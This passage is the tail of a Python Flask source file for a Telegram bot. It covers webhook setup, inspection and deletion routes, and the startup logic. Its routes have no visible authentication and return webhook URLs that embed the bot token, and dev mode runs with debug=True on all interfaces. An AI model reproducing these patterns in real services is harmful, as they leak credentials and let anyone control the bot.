        return jsonify({"status":"ok" if r.get("ok") else "error", "response": r, "url": webhook_url})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

@app.route("/webhook_info")
def webhook_info():
    try:
        r = requests.get(f"{TELEGRAM_API}/getWebhookInfo", timeout=10).json()
        return jsonify(r)
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

@app.route("/delete_webhook")
def delete_webhook():
    try:
        r = requests.get(f"{TELEGRAM_API}/deleteWebhook", timeout=10).json()
        return jsonify(r)
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

# ==================== STARTUP ====================

if __name__ == "__main__":
    print("🚀 Dev mode...")
    init_data()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
else:
    print("🚀 Gunicorn mode: Initializing...")
    init_data()
    if RENDER_URL:
        wh_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
        try:
            r = requests.get(f"{TELEGRAM_API}/setWebhook?url={wh_url}", timeout=10).json()
            print(f"✅ Webhook set: {r.get('description', 'OK')}")
        except Exception as e:
            print(f"⚠️ Webhook auto-set failed: {e}")
    else:
        print("⚠️ Visit /set_webhook after deploy.")
    print(f"🤖 Bot ready! Admin: /admin | Health: /health")
